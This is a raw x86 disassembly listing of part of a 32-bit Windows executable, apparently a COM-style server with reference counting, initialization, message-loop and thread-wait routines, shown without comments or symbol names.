  404b70:	push   esi
  404b71:	mov    DWORD PTR [ebp-0xa38],edi
  404b77:	call   DWORD PTR ds:0x40804c
  404b7d:	test   eax,eax
  404b7f:	jne    0x404b8d
  404b81:	call   0x40354f
  404b86:	mov    esi,eax
  404b88:	jmp    0x404cc4
  404b8d:	cmp    eax,0x104
  404b92:	jne    0x404ba9
  404b94:	lea    ecx,[ebp-0xa38]
  404b9a:	call   0x403968
  404b9f:	mov    esi,0x8007007a
  404ba4:	jmp    0x404ccf
  404ba9:	push   0x27
  404bab:	mov    eax,edi
  404bad:	lea    edx,[ebp-0x20c]
  404bb3:	pop    edi
  404bb4:	movzx  ecx,WORD PTR [edx]
  404bb7:	test   cx,cx
  404bba:	je     0x404be4
  404bbc:	mov    WORD PTR [ebp+eax*2-0x61c],cx
  404bc4:	cmp    cx,di
  404bc7:	jne    0x404bd9
  404bc9:	cmp    eax,0x206
  404bce:	jae    0x404bd9
  404bd0:	inc    eax
  404bd1:	mov    WORD PTR [ebp+eax*2-0x61c],di
  404bd9:	add    edx,0x2
  404bdc:	inc    eax
  404bdd:	cmp    eax,0x207
  404be2:	jb     0x404bb4
  404be4:	xor    ecx,ecx
  404be6:	mov    WORD PTR [ebp+eax*2-0x61c],cx
  404bee:	push   ecx
  404bef:	pop    edi
  404bf0:	test   esi,esi
  404bf2:	je     0x404c0a
  404bf4:	push   edi
  404bf5:	call   DWORD PTR ds:0x408030
  404bfb:	cmp    esi,eax
  404bfd:	je     0x404c0a
  404bff:	lea    eax,[ebp-0x61c]
  404c05:	jmp    0x404c8e
  404c0a:	push   0x22
  404c0c:	pop    esi
  404c0d:	lea    ecx,[ebp-0x61c]
  404c13:	mov    WORD PTR [ebp-0xa34],si
  404c1a:	call   0x403320
  404c1f:	lea    eax,[eax*2+0x2]
  404c26:	push   eax
  404c27:	lea    eax,[ebp-0x61c]
  404c2d:	push   eax
  404c2e:	lea    eax,[ebp-0xa32]
  404c34:	push   0x416
  404c39:	push   eax
  404c3a:	call   DWORD PTR ds:0x408138
  404c40:	add    esp,0x10
  404c43:	test   eax,eax
  404c45:	je     0x404c59
  404c47:	lea    ecx,[ebp-0xa38]
  404c4d:	call   0x403968
  404c52:	mov    esi,0x80004005
  404c57:	jmp    0x404ccf
  404c59:	lea    ecx,[ebp-0xa34]
  404c5f:	call   0x403320
  404c64:	mov    WORD PTR [ebp+eax*2-0xa34],si
  404c6c:	lea    eax,[eax*2+0x2]
  404c73:	cmp    eax,0x418
  404c78:	jae    0x404d2a
  404c7e:	xor    ecx,ecx
  404c80:	mov    WORD PTR [ebp+eax*1-0xa34],cx
  404c88:	lea    eax,[ebp-0xa34]
  404c8e:	push   eax
  404c8f:	push   0x4014d4
  404c94:	lea    eax,[ebp-0xa50]
  404c9a:	push   eax
  404c9b:	call   0x4034c0
  404ca0:	mov    esi,eax
  404ca2:	test   esi,esi
  404ca4:	js     0x404cc4
  404ca6:	lea    eax,[ebp-0x61c]
  404cac:	push   eax
  404cad:	push   0x4014e4
  404cb2:	lea    eax,[ebp-0xa50]
  404cb8:	push   eax
  404cb9:	call   0x4034c0
  404cbe:	mov    esi,eax
  404cc0:	test   esi,esi
  404cc2:	jns    0x404cef
  404cc4:	lea    ecx,[ebp-0xa38]
  404cca:	call   0x403968
  404ccf:	lea    ecx,[ebp-0xa50]
  404cd5:	call   0x4032f9
  404cda:	mov    ecx,DWORD PTR [ebp-0x4]
  404cdd:	mov    eax,esi
  404cdf:	pop    edi
  404ce0:	pop    esi
  404ce1:	xor    ecx,ebp
  404ce3:	pop    ebx
  404ce4:	call   0x406340
  404ce9:	mov    esp,ebp
  404ceb:	pop    ebp
  404cec:	ret    0x8
  404cef:	cmp    DWORD PTR [ebp+0x8],0x0
  404cf3:	lea    ecx,[ebp-0xa50]
  404cf9:	mov    DWORD PTR [ebp-0xa3c],edi
  404cff:	movzx  eax,bx
  404d02:	je     0x404d08
  404d04:	push   0x1
  404d06:	jmp    0x404d09
  404d08:	push   edi
  404d09:	push   0x4014fc
  404d0e:	push   eax
  404d0f:	lea    eax,[ebp-0x20c]
  404d15:	push   eax
  404d16:	call   0x40496b
  404d1b:	lea    ecx,[ebp-0xa3c]
  404d21:	mov    esi,eax
  404d23:	call   0x403968
  404d28:	jmp    0x404cc4
  404d2a:	call   0x406500
  404d2f:	int3   
  404d30:	int3   
  404d31:	int3   
  404d32:	int3   
  404d33:	int3   
  404d34:	int3   
  404d35:	mov    edi,edi
  404d37:	push   ebp
  404d38:	mov    ebp,esp
  404d3a:	sub    esp,0x10
  404d3d:	and    DWORD PTR [ebp-0x8],0x0
  404d41:	lea    eax,[ebp-0x10]
  404d44:	and    DWORD PTR [ebp-0x4],0x0
  404d48:	push   eax
  404d49:	push   ecx
  404d4a:	push   0x65
  404d4c:	pop    edx
  404d4d:	mov    DWORD PTR [ebp-0x10],0x40188c
  404d54:	mov    DWORD PTR [ebp-0xc],0x401758
  404d5b:	call   0x404ada
  404d60:	mov    esp,ebp
  404d62:	pop    ebp
  404d63:	ret    
  404d64:	int3   
  404d65:	int3   
  404d66:	int3   
  404d67:	int3   
  404d68:	int3   
  404d69:	int3   
  404d6a:	int3   
  404d6b:	int3   
  404d6c:	int3   
  404d6d:	int3   
  404d6e:	int3   
  404d6f:	int3   
  404d70:	mov    edi,edi
  404d72:	push   ebp
  404d73:	mov    ebp,esp
  404d75:	push   esi
  404d76:	mov    esi,ecx
  404d78:	call   0x404eb3
  404d7d:	test   BYTE PTR [ebp+0x8],0x1
  404d81:	je     0x404d8a
  404d83:	push   esi
  404d84:	call   0x405f80
  404d89:	pop    ecx
  404d8a:	mov    eax,esi
  404d8c:	pop    esi
  404d8d:	pop    ebp
  404d8e:	ret    0x4
  404d91:	int3   
  404d92:	int3   
  404d93:	int3   
  404d94:	int3   
  404d95:	int3   
  404d96:	mov    edi,edi
  404d98:	push   ebp
  404d99:	mov    ebp,esp
  404d9b:	push   ecx
  404d9c:	cmp    BYTE PTR ds:0x407400,0x0
  404da3:	je     0x404daa
  404da5:	or     eax,0xffffffff
  404da8:	jmp    0x404dcd
  404daa:	and    DWORD PTR [ebp-0x4],0x0
  404dae:	call   DWORD PTR ds:0x408070
  404db4:	lea    ecx,[ebp-0x4]
  404db7:	push   ecx
  404db8:	push   eax
  404db9:	call   0x404f74
  404dbe:	cmp    al,0x1
  404dc0:	jne    0x404dca
  404dc2:	push   ecx
  404dc3:	call   0x405037
  404dc8:	jmp    0x404dcd
  404dca:	mov    eax,DWORD PTR [ebp-0x4]
  404dcd:	mov    esp,ebp
  404dcf:	pop    ebp
  404dd0:	ret    0x10
  404dd3:	int3   
  404dd4:	int3   
  404dd5:	int3   
  404dd6:	int3   
  404dd7:	int3   
  404dd8:	mov    edi,edi
  404dda:	push   ebx
  404ddb:	push   esi
  404ddc:	push   edi
  404ddd:	mov    edx,0x407458
  404de2:	mov    DWORD PTR ds:0x407414,0x407448
  404dec:	push   0x6
  404dee:	pop    ecx
  404def:	xor    eax,eax
  404df1:	mov    edi,edx
  404df3:	rep stos DWORD PTR es:[edi],eax
  404df5:	xor    ebx,ebx
  404df7:	mov    ecx,edx
  404df9:	mov    DWORD PTR ds:0x40744c,ebx
  404dff:	mov    DWORD PTR ds:0x407454,ebx
  404e05:	mov    DWORD PTR ds:0x407450,ebx
  404e0b:	mov    DWORD PTR ds:0x407470,ebx
  404e11:	call   0x4028dd
  404e16:	test   eax,eax
  404e18:	jns    0x404e23
  404e1a:	mov    BYTE PTR ds:0x407400,0x1
  404e21:	jmp    0x404e2d
  404e23:	mov    DWORD PTR ds:0x40744c,0x24
  404e2d:	mov    esi,0x401398
  404e32:	mov    edi,0x407404
  404e37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e3b:	call   DWORD PTR ds:0x408068
  404e41:	push   ebx
  404e42:	mov    ds:0x407474,eax
  404e47:	mov    DWORD PTR ds:0x407478,ebx
  404e4d:	mov    DWORD PTR ds:0x40747c,0x1388
  404e57:	mov    DWORD PTR ds:0x407480,0x3e8
  404e61:	mov    BYTE PTR ds:0x407484,0x1
  404e68:	mov    BYTE PTR ds:0x407486,bl
  404e6e:	call   DWORD PTR ds:0x40818c
  404e74:	pop    edi
  404e75:	pop    esi
  404e76:	pop    ebx
  404e77:	test   eax,eax
  404e79:	jns    0x404e9a
  404e7b:	cmp    eax,0x80010106
  404e80:	jne    0x404e91
  404e82:	push   0x4017a8
  404e87:	call   DWORD PTR ds:0x408030
  404e8d:	test   eax,eax
  404e8f:	jne    0x404ea1
  404e91:	mov    BYTE PTR ds:0x407400,0x1
  404e98:	jmp    0x404ea8
  404e9a:	mov    BYTE PTR ds:0x407486,0x1
  404ea1:	push   0x1
  404ea3:	call   0x405dc8
  404ea8:	mov    eax,0x407448
  404ead:	ret    
  404eae:	int3   
  404eaf:	int3   
  404eb0:	int3   
  404eb1:	int3   
  404eb2:	int3   
  404eb3:	mov    edi,edi
  404eb5:	push   esi
  404eb6:	push   0x0
  404eb8:	mov    esi,ecx
  404eba:	call   0x405dc8
  404ebf:	mov    ecx,esi
  404ec1:	call   0x405d60
  404ec6:	call   0x405c7c
  404ecb:	cmp    BYTE PTR [esi+0x3e],0x0
  404ecf:	je     0x404ed7
  404ed1:	call   DWORD PTR ds:0x408188
  404ed7:	mov    ecx,esi
  404ed9:	pop    esi
  404eda:	jmp    0x405d60
  404edf:	int3   
  404ee0:	int3   
  404ee1:	int3   
  404ee2:	int3   
  404ee3:	int3   
  404ee4:	int3   
  404ee5:	int3   
  404ee6:	int3   
  404ee7:	int3   
  404ee8:	int3   
  404ee9:	int3   
  404eea:	int3   
  404eeb:	int3   
  404eec:	int3   
  404eed:	int3   
  404eee:	int3   
  404eef:	int3   
  404ef0:	mov    edi,edi
  404ef2:	push   esi
  404ef3:	or     esi,0xffffffff
  404ef6:	lock xadd DWORD PTR [ecx+0x8],esi
  404efb:	dec    esi
  404efc:	jne    0x404f22
  404efe:	cmp    BYTE PTR [ecx+0x3c],0x0
  404f02:	je     0x404f13
  404f04:	push   DWORD PTR [ecx+0x30]
  404f07:	mov    BYTE PTR [ecx+0x3d],0x1
  404f0b:	call   DWORD PTR ds:0x40806c
  404f11:	jmp    0x404f22
  404f13:	push   0x0
  404f15:	push   0x0
  404f17:	push   0x12
  404f19:	push   DWORD PTR [ecx+0x2c]
  404f1c:	call   DWORD PTR ds:0x4080f0
  404f22:	mov    eax,esi
  404f24:	pop    esi
  404f25:	ret    
  404f26:	int3   
  404f27:	int3   
  404f28:	int3   
  404f29:	int3   
  404f2a:	int3   
  404f2b:	int3   
  404f2c:	int3   
  404f2d:	int3   
  404f2e:	int3   
  404f2f:	int3   
  404f30:	mov    edi,edi
  404f32:	push   ebp
  404f33:	mov    ebp,esp
  404f35:	push   ecx
  404f36:	mov    eax,ds:0x407008
  404f3b:	xor    eax,ebp
  404f3d:	mov    DWORD PTR [ebp-0x4],eax
  404f40:	mov    eax,DWORD PTR [ebp+0x8]
  404f43:	push   esi
  404f44:	push   0x401758
  404f49:	push   0x40188c
  404f4e:	mov    ecx,DWORD PTR [eax]
  404f50:	push   eax
  404f51:	mov    esi,DWORD PTR [ecx+0xc]
  404f54:	mov    ecx,esi
  404f56:	call   DWORD PTR ds:0x4081a0
  404f5c:	call   esi
  404f5e:	mov    ecx,DWORD PTR [ebp-0x4]
  404f61:	xor    ecx,ebp
  404f63:	pop    esi
  404f64:	call   0x406340
  404f69:	mov    esp,ebp
  404f6b:	pop    ebp
  404f6c:	ret    0x4
  404f6f:	int3   
  404f70:	int3   
  404f71:	int3   
  404f72:	int3   
  404f73:	int3   
  404f74:	mov    edi,edi
  404f76:	push   ebp
  404f77:	mov    ebp,esp
  404f79:	sub    esp,0xc
  404f7c:	mov    eax,ds:0x407008
  404f81:	xor    eax,ebp
  404f83:	mov    DWORD PTR [ebp-0x4],eax
  404f86:	mov    ecx,DWORD PTR [ebp+0x8]
  404f89:	push   esi
  404f8a:	mov    esi,DWORD PTR [ebp+0xc]
  404f8d:	push   edi
  404f8e:	and    DWORD PTR [esi],0x0
  404f91:	mov    eax,ds:0x4017c0
  404f96:	mov    DWORD PTR [ebp-0xc],eax
  404f99:	mov    ax,ds:0x4017c4
  404f9f:	mov    WORD PTR [ebp-0x8],ax
  404fa3:	jmp    0x404fc7
  404fa5:	mov    edx,0x4017c8
  404faa:	mov    ecx,edi
  404fac:	call   0x405b86
  404fb1:	test   eax,eax
  404fb3:	je     0x405000
  404fb5:	mov    edx,0x4017e0
  404fba:	mov    ecx,edi
  404fbc:	call   0x405b86
  404fc1:	test   eax,eax
  404fc3:	je     0x404fe9
  404fc5:	mov    ecx,edi
  404fc7:	lea    edx,[ebp-0xc]
  404fca:	call   0x405c2e
  404fcf:	mov    edi,eax
  404fd1:	test   edi,edi
  404fd3:	jne    0x404fa5
  404fd5:	mov    al,0x1
  404fd7:	mov    ecx,DWORD PTR [ebp-0x4]
  404fda:	pop    edi
  404fdb:	xor    ecx,ebp
  404fdd:	pop    esi
  404fde:	call   0x406340
  404fe3:	mov    esp,ebp
  404fe5:	pop    ebp
  404fe6:	ret    0x8
  404fe9:	xor    ecx,ecx
  404feb:	inc    ecx
  404fec:	call   0x404d35
  404ff1:	mov    DWORD PTR [esi],eax
  404ff3:	test   eax,eax
  404ff5:	js     0x40502e
  404ff7:	push   ecx
  404ff8:	push   ecx
  404ff9:	call   0x40513f
  404ffe:	jmp    0x40502c
  405000:	mov    edi,DWORD PTR ds:0x40741c
  405006:	test   edi,edi
  405008:	je     0x405018
  40500a:	mov    ecx,edi
  40500c:	call   DWORD PTR ds:0x4081a0
  405012:	call   edi
  405014:	test   eax,eax
  405016:	js     0x40501f
  405018:	push   ecx
  405019:	push   ecx
  40501a:	call   0x405479
  40501f:	mov    DWORD PTR [esi],eax
  405021:	test   eax,eax
  405023:	js     0x40502e
  405025:	xor    ecx,ecx
  405027:	call   0x404d35
  40502c:	mov    DWORD PTR [esi],eax
  40502e:	xor    al,al
  405030:	jmp    0x404fd7
  405032:	int3   
  405033:	int3   
  405034:	int3   
  405035:	int3   
  405036:	int3   
  405037:	mov    edi,edi
  405039:	push   ebp
  40503a:	mov    ebp,esp
  40503c:	mov    eax,ds:0x407088
  405041:	sub    esp,0x1c
  405044:	push   ebx
  405045:	push   esi
  405046:	xor    esi,esi
  405048:	push   edi
  405049:	mov    edi,DWORD PTR ds:0x407084
  40504f:	inc    esi
  405050:	jmp    0x40506c
  405052:	test   esi,esi
  405054:	js     0x405070
  405056:	mov    ecx,DWORD PTR [edi]
  405058:	test   ecx,ecx
  40505a:	je     0x405069
  40505c:	push   ecx
  40505d:	call   0x40533f
  405062:	mov    esi,eax
  405064:	mov    eax,ds:0x407088
  405069:	add    edi,0x4
  40506c:	cmp    edi,eax
  40506e:	jb     0x405052
  405070:	xor    ebx,ebx
  405072:	test   esi,esi
  405074:	jne    0x40508e
  405076:	cmp    BYTE PTR ds:0x407484,bl
  40507c:	je     0x405094
  40507e:	call   0x4051ef
  405083:	test   eax,eax
  405085:	jne    0x405094
  405087:	mov    esi,0x80004005
  40508c:	jmp    0x405094
  40508e:	mov    BYTE PTR ds:0x407484,bl
  405094:	test   esi,esi
  405096:	jne    0x4050d0
  405098:	push   ebx
  405099:	push   ebx
  40509a:	push   ebx
  40509b:	lea    eax,[ebp-0x1c]
  40509e:	push   eax
  40509f:	call   DWORD PTR ds:0x4080e0
  4050a5:	test   eax,eax
  4050a7:	jle    0x4050d2
  4050a9:	lea    eax,[ebp-0x1c]
  4050ac:	push   eax
  4050ad:	call   DWORD PTR ds:0x4080e4
  4050b3:	lea    eax,[ebp-0x1c]
  4050b6:	push   eax
  4050b7:	call   DWORD PTR ds:0x4080e8
  4050bd:	push   ebx
  4050be:	push   ebx
  4050bf:	push   ebx
  4050c0:	lea    eax,[ebp-0x1c]
  4050c3:	push   eax
  4050c4:	call   DWORD PTR ds:0x4080e0
  4050ca:	test   eax,eax
  4050cc:	jg     0x4050a9
  4050ce:	test   esi,esi
  4050d0:	js     0x4050d9
  4050d2:	call   0x4050e9
  4050d7:	mov    esi,eax
  4050d9:	pop    edi
  4050da:	mov    eax,esi
  4050dc:	pop    esi
  4050dd:	pop    ebx
  4050de:	mov    esp,ebp
  4050e0:	pop    ebp
  4050e1:	ret    0x4
  4050e4:	int3   
  4050e5:	int3   
  4050e6:	int3   
  4050e7:	int3   
  4050e8:	int3   
  4050e9:	mov    eax,ds:0x407088
  4050ee:	push   esi
  4050ef:	mov    esi,DWORD PTR ds:0x407084
  4050f5:	push   edi
  4050f6:	xor    edi,edi
  4050f8:	jmp    0x40511c
  4050fa:	test   edi,edi
  4050fc:	jne    0x405120
  4050fe:	mov    ecx,DWORD PTR [esi]
  405100:	test   ecx,ecx
  405102:	je     0x405119
  405104:	cmp    DWORD PTR [ecx+0x14],edi
  405107:	je     0x405119
  405109:	push   DWORD PTR [ecx+0x14]
  40510c:	call   DWORD PTR ds:0x408178
  405112:	mov    edi,eax
  405114:	mov    eax,ds:0x407088
  405119:	add    esi,0x4
  40511c:	cmp    esi,eax
  40511e:	jb     0x4050fa
  405120:	cmp    BYTE PTR ds:0x407484,0x0
  405127:	je     0x405135
  405129:	push   DWORD PTR ds:0x407480
  40512f:	call   DWORD PTR ds:0x408074
  405135:	mov    eax,edi
  405137:	pop    edi
  405138:	pop    esi
  405139:	ret    
  40513a:	int3   
  40513b:	int3   
  40513c:	int3   
  40513d:	int3   
  40513e:	int3   
  40513f:	mov    edi,edi
  405141:	push   ebp
  405142:	mov    ebp,esp
  405144:	and    esp,0xfffffff8
  405147:	push   ecx
  405148:	mov    eax,ds:0x407008
  40514d:	xor    eax,esp
  40514f:	mov    DWORD PTR [esp],eax
  405152:	mov    ecx,DWORD PTR ds:0x407088
  405158:	xor    eax,eax
  40515a:	push   ebx
  40515b:	push   esi
  40515c:	push   edi
  40515d:	mov    edi,DWORD PTR ds:0x407084
  405163:	cmp    edi,ecx
  405165:	jae    0x4051ad
  405167:	mov    ebx,DWORD PTR [edi]
  405169:	test   ebx,ebx
  40516b:	je     0x4051a2
  40516d:	mov    esi,DWORD PTR [ebx+0x4]
  405170:	mov    ecx,esi
  405172:	push   0x1
  405174:	call   DWORD PTR ds:0x4081a0
  40517a:	call   esi
  40517c:	test   eax,eax
  40517e:	js     0x4051d6
  405180:	mov    esi,DWORD PTR [ebx+0x1c]
  405183:	mov    ecx,esi
  405185:	push   0x1
  405187:	call   DWORD PTR ds:0x4081a0
  40518d:	call   esi
  40518f:	mov    ecx,DWORD PTR [ebx]
  405191:	mov    edx,eax
  405193:	call   0x40550b
  405198:	test   eax,eax
  40519a:	js     0x4051d6
  40519c:	mov    ecx,DWORD PTR ds:0x407088
  4051a2:	add    edi,0x4
  4051a5:	cmp    edi,ecx
  4051a7:	jb     0x405167
  4051a9:	test   eax,eax
  4051ab:	js     0x4051d6
  4051ad:	mov    ecx,DWORD PTR ds:0x407080
  4051b3:	call   0x405a10
  4051b8:	test   eax,eax
  4051ba:	js     0x4051d6
  4051bc:	mov    esi,DWORD PTR ds:0x407418
  4051c2:	test   esi,esi
  4051c4:	je     0x4051d6
  4051c6:	push   DWORD PTR ds:0x40748c
  4051cc:	mov    ecx,esi
  4051ce:	call   DWORD PTR ds:0x4081a0
  4051d4:	call   esi
  4051d6:	mov    ecx,DWORD PTR [esp+0xc]
  4051da:	pop    edi
  4051db:	pop    esi
  4051dc:	pop    ebx
  4051dd:	xor    ecx,esp
  4051df:	call   0x406340
  4051e4:	mov    esp,ebp
  4051e6:	pop    ebp
  4051e7:	ret    0x8
  4051ea:	int3   
  4051eb:	int3   
  4051ec:	int3   
  4051ed:	int3   
  4051ee:	int3   
  4051ef:	mov    edi,edi
  4051f1:	push   ebp
  4051f2:	mov    ebp,esp
  4051f4:	push   ecx
  4051f5:	push   esi
  4051f6:	xor    esi,esi
  4051f8:	push   esi
  4051f9:	push   esi
  4051fa:	push   esi
  4051fb:	push   esi
  4051fc:	call   DWORD PTR ds:0x408078
  405202:	mov    ds:0x407478,eax
  405207:	test   eax,eax
  405209:	je     0x405236
  40520b:	lea    eax,[ebp-0x4]
  40520e:	push   eax
  40520f:	push   esi
  405210:	push   0x407448
  405215:	push   0x405240
  40521a:	push   esi
  40521b:	push   esi
  40521c:	call   DWORD PTR ds:0x40807c
  405222:	mov    esi,eax
  405224:	test   esi,esi
  405226:	jne    0x405234
  405228:	push   DWORD PTR ds:0x407478
  40522e:	call   DWORD PTR ds:0x408080
  405234:	mov    eax,esi
  405236:	pop    esi
  405237:	mov    esp,ebp
  405239:	pop    ebp
  40523a:	ret    
  40523b:	int3   
  40523c:	int3   
  40523d:	int3   
  40523e:	int3   
  40523f:	int3   
  405240:	mov    edi,edi
  405242:	push   ebp
  405243:	mov    ebp,esp
  405245:	push   ebx
  405246:	push   esi
  405247:	mov    esi,DWORD PTR [ebp+0x8]
  40524a:	xor    ebx,ebx
  40524c:	push   0xffffffff
  40524e:	push   DWORD PTR [esi+0x30]
  405251:	call   DWORD PTR ds:0x408084
  405257:	push   DWORD PTR [esi+0x34]
  40525a:	mov    BYTE PTR [esi+0x3d],bl
  40525d:	push   DWORD PTR [esi+0x30]
  405260:	call   DWORD PTR ds:0x408084
  405266:	test   eax,eax
  405268:	je     0x405257
  40526a:	cmp    BYTE PTR [esi+0x3d],bl
  40526d:	jne    0x40524c
  40526f:	cmp    DWORD PTR [esi+0x8],ebx
  405272:	jne    0x40524c
  405274:	push   DWORD PTR [esi+0x30]
  405277:	call   DWORD PTR ds:0x408080
  40527d:	push   ebx
  40527e:	push   ebx
  40527f:	push   0x12
  405281:	push   DWORD PTR [esi+0x2c]
  405284:	call   DWORD PTR ds:0x4080f0
  40528a:	pop    esi
  40528b:	xor    eax,eax
  40528d:	pop    ebx
  40528e:	pop    ebp
  40528f:	ret    0x4
  405292:	int3   
  405293:	int3   
  405294:	int3   
  405295:	int3   
  405296:	int3   
  405297:	int3   
  405298:	int3   
  405299:	int3   
  40529a:	int3   
  40529b:	int3   
  40529c:	int3   
  40529d:	int3   
  40529e:	int3   
  40529f:	int3   
  4052a0:	mov    edi,edi
  4052a2:	push   ebp
  4052a3:	mov    ebp,esp
  4052a5:	push   ecx
  4052a6:	mov    eax,ds:0x407008
  4052ab:	xor    eax,ebp
  4052ad:	mov    DWORD PTR [ebp-0x4],eax
  4052b0:	push   ebx
  4052b1:	mov    ebx,DWORD PTR [ebp+0x8]
  4052b4:	test   ebx,ebx
  4052b6:	jne    0x4052bf
  4052b8:	mov    eax,0x80004003
  4052bd:	jmp    0x4052fe
  4052bf:	push   esi
  4052c0:	push   edi
  4052c1:	xor    edi,edi
  4052c3:	lea    esi,[ecx+0x28]
  4052c6:	cmp    DWORD PTR [esi],edi
  4052c8:	jne    0x4052e4
  4052ca:	push   esi
  4052cb:	push   0x4017f4
  4052d0:	push   0x1
  4052d2:	push   edi
  4052d3:	push   0x40128c
  4052d8:	call   DWORD PTR ds:0x408180
  4052de:	mov    edi,eax
  4052e0:	test   edi,edi
  4052e2:	js     0x4052fa
  4052e4:	mov    ecx,DWORD PTR [esi]
  4052e6:	mov    DWORD PTR [ebx],ecx
  4052e8:	mov    ecx,DWORD PTR [esi]
  4052ea:	push   ecx
  4052eb:	mov    edx,DWORD PTR [ecx]
  4052ed:	mov    esi,DWORD PTR [edx+0x4]
  4052f0:	mov    ecx,esi
  4052f2:	call   DWORD PTR ds:0x4081a0
  4052f8:	call   esi
  4052fa:	mov    eax,edi
  4052fc:	pop    edi
  4052fd:	pop    esi
  4052fe:	mov    ecx,DWORD PTR [ebp-0x4]
  405301:	xor    ecx,ebp
  405303:	pop    ebx
  405304:	call   0x406340
  405309:	mov    esp,ebp
  40530b:	pop    ebp
  40530c:	ret    0x4
  40530f:	int3   
  405310:	int3   
  405311:	int3   
  405312:	int3   
  405313:	int3   
  405314:	int3   
  405315:	int3   
  405316:	int3   
  405317:	int3   
  405318:	int3   
  405319:	int3   
  40531a:	int3   
  40531b:	int3   
  40531c:	int3   
  40531d:	int3   
  40531e:	int3   
  40531f:	int3   
  405320:	mov    eax,DWORD PTR [ecx+0x8]
  405323:	ret    
  405324:	int3   
  405325:	int3   
  405326:	int3   
  405327:	int3   
  405328:	int3   
  405329:	int3   
  40532a:	int3   
  40532b:	int3   
  40532c:	int3   
  40532d:	int3   
  40532e:	int3   
  40532f:	int3   
  405330:	xor    eax,eax
  405332:	inc    eax
  405333:	lock xadd DWORD PTR [ecx+0x8],eax
  405338:	inc    eax
  405339:	ret    
  40533a:	int3   
  40533b:	int3   
  40533c:	int3   
  40533d:	int3   
  40533e:	int3   
  40533f:	mov    edi,edi
  405341:	push   ebp
  405342:	mov    ebp,esp
  405344:	push   ecx
  405345:	push   ecx
  405346:	mov    eax,ds:0x407008
  40534b:	xor    eax,ebp
  40534d:	mov    DWORD PTR [ebp-0x4],eax
  405350:	and    DWORD PTR [ebp-0x8],0x0
  405354:	push   esi
  405355:	mov    esi,ecx
  405357:	push   edi
  405358:	mov    edi,DWORD PTR [esi+0x8]
  40535b:	test   edi,edi
  40535d:	jne    0x405363
  40535f:	xor    eax,eax
  405361:	jmp    0x4053ad
  405363:	lea    eax,[ebp-0x8]
  405366:	mov    ecx,edi
  405368:	push   eax
  405369:	push   0x4014c4
  40536e:	push   DWORD PTR [esi+0xc]
  405371:	call   DWORD PTR ds:0x4081a0
  405377:	call   edi
  405379:	mov    edi,eax
  40537b:	test   edi,edi
  40537d:	js     0x405394
  40537f:	lea    eax,[esi+0x14]
  405382:	push   eax
  405383:	push   0x1
  405385:	push   0x4
  405387:	push   DWORD PTR [ebp-0x8]
  40538a:	push   DWORD PTR [esi]
  40538c:	call   DWORD PTR ds:0x40817c
  405392:	mov    edi,eax
  405394:	mov    ecx,DWORD PTR [ebp-0x8]
  405397:	test   ecx,ecx
  405399:	je     0x4053ab
  40539b:	mov    eax,DWORD PTR [ecx]
  40539d:	push   ecx
  40539e:	mov    esi,DWORD PTR [eax+0x8]
  4053a1:	mov    ecx,esi
  4053a3:	call   DWORD PTR ds:0x4081a0
  4053a9:	call   esi
  4053ab:	mov    eax,edi
  4053ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4053b0:	pop    edi
  4053b1:	xor    ecx,ebp
  4053b3:	pop    esi
  4053b4:	call   0x406340
  4053b9:	mov    esp,ebp
  4053bb:	pop    ebp
  4053bc:	ret    0x4
  4053bf:	int3   
  4053c0:	int3   
  4053c1:	int3   
  4053c2:	int3   
  4053c3:	int3   
  4053c4:	mov    edi,edi
  4053c6:	push   ebp
  4053c7:	mov    ebp,esp
  4053c9:	sub    esp,0x10
  4053cc:	mov    eax,ds:0x407008
  4053d1:	xor    eax,ebp
  4053d3:	mov    DWORD PTR [ebp-0x4],eax
  4053d6:	and    DWORD PTR [ebp-0x10],0x0
  4053da:	lea    eax,[ebp-0x8]
  4053dd:	and    DWORD PTR [ebp-0x8],0x0
  4053e1:	push   esi
  4053e2:	push   edi
  4053e3:	push   eax
  4053e4:	lea    eax,[ebp-0x10]
  4053e7:	push   eax
  4053e8:	call   0x40589c
  4053ed:	mov    edi,eax
  4053ef:	test   edi,edi
  4053f1:	js     0x405442
  4053f3:	mov    eax,DWORD PTR [ebp-0x8]
  4053f6:	lea    edx,[ebp-0xc]
  4053f9:	push   edx
  4053fa:	push   eax
  4053fb:	mov    ecx,DWORD PTR [eax]
  4053fd:	mov    esi,DWORD PTR [ecx+0x1c]
  405400:	mov    ecx,esi
  405402:	call   DWORD PTR ds:0x4081a0
  405408:	call   esi
  40540a:	mov    edi,eax
  40540c:	test   edi,edi
  40540e:	js     0x405442
  405410:	mov    ecx,DWORD PTR [ebp-0xc]
  405413:	push   DWORD PTR [ecx+0x14]
  405416:	movzx  eax,WORD PTR [ecx+0x1a]
  40541a:	push   DWORD PTR [ecx+0x10]
  40541d:	push   eax
  40541e:	movzx  eax,WORD PTR [ecx+0x18]
  405422:	push   eax
  405423:	push   ecx
  405424:	call   DWORD PTR ds:0x4080b8
  40542a:	push   DWORD PTR [ebp-0xc]
  40542d:	mov    edi,eax
  40542f:	mov    eax,DWORD PTR [ebp-0x8]
  405432:	push   eax
  405433:	mov    ecx,DWORD PTR [eax]
  405435:	mov    esi,DWORD PTR [ecx+0x30]
  405438:	mov    ecx,esi
  40543a:	call   DWORD PTR ds:0x4081a0
  405440:	call   esi
  405442:	mov    eax,DWORD PTR [ebp-0x8]
  405445:	test   eax,eax
  405447:	je     0x405459
  405449:	mov    ecx,DWORD PTR [eax]
  40544b:	push   eax
  40544c:	mov    esi,DWORD PTR [ecx+0x8]
  40544f:	mov    ecx,esi
  405451:	call   DWORD PTR ds:0x4081a0
  405457:	call   esi
  405459:	push   DWORD PTR [ebp-0x10]
  40545c:	call   DWORD PTR ds:0x4080cc
  405462:	mov    ecx,DWORD PTR [ebp-0x4]
  405465:	mov    eax,edi
  405467:	pop    edi
  405468:	xor    ecx,ebp
  40546a:	pop    esi
  40546b:	call   0x406340
  405470:	mov    esp,ebp
  405472:	pop    ebp
  405473:	ret    
  405474:	int3   
  405475:	int3   
  405476:	int3   
  405477:	int3   
  405478:	int3   
  405479:	mov    edi,edi
  40547b:	push   ebp
  40547c:	mov    ebp,esp
  40547e:	and    esp,0xfffffff8
  405481:	push   ecx
  405482:	mov    eax,ds:0x407008
  405487:	xor    eax,esp
  405489:	mov    DWORD PTR [esp],eax
  40548c:	mov    ecx,DWORD PTR ds:0x407088
  405492:	xor    eax,eax
